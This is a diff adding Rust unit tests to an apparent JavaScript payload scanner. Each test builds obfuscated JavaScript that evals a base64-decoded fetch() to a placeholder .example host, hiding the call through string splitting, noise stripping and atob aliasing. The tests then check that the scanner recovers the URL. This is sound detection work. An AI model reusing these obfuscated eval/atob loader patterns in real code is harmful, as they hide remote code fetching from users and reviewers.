@@ -39951,6 +39951,169 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_atob_bracket_replace_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-bracket-replace-js.example/p')",
+        );
+        let noisy = encoded.chars().flat_map(|ch| [ch, '~']).collect::<String>();
+        let js = format!(r#"var b = "{noisy}"; eval(atob(b["replace"](/~/g, "")))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-bracket-replace-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob bracket replace payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_bound_bracket_replace_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-bound-bracket-replace-js.example/p')",
+        );
+        let noisy = encoded.chars().flat_map(|ch| [ch, '~']).collect::<String>();
+        let js = format!(r#"var m = "replace"; var b = "{noisy}"; eval(atob(b[m](/~/g, "")))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-bound-bracket-replace-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob bound bracket replace payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_concat_arg_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-concat-arg-js.example/p')",
+        );
+        let split = encoded.len() / 2;
+        let (left, right) = encoded.split_at(split);
+        let js = format!(r#"var p = "{left}"; var q = "{right}"; eval(atob(p + q))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-concat-arg-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob concat arg payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_concat_method_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-concat-method-js.example/p')",
+        );
+        let split = encoded.len() / 2;
+        let (left, right) = encoded.split_at(split);
+        let js =
+            format!(r#"var a = "{left}"; var b = "{right}"; eval(atob(a.concat(b)))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-concat-method-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob concat method payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_function_alias_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-alias-js.example/p')",
+        );
+        let js = format!(r#"var d = window.atob; eval(d("{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-alias-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob function alias payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_dynamic_member_function_alias_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-dynamic-member-alias-js.example/p')",
+        );
+        let js =
+            format!(r#"var k = "at" + "ob"; var d = window[k]; eval(d("{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-dynamic-member-alias-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob dynamic member function alias payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_member_property_alias_not_decoded() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-property-alias-js.example/p')",
+        );
+        let js = format!(r#"var d = window.atob.toString; eval(d("{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-property-alias-js.example/p"
+            )
+        });
+        assert!(
+            !has,
+            "JS atob member property alias was decoded as a payload: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_apply_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
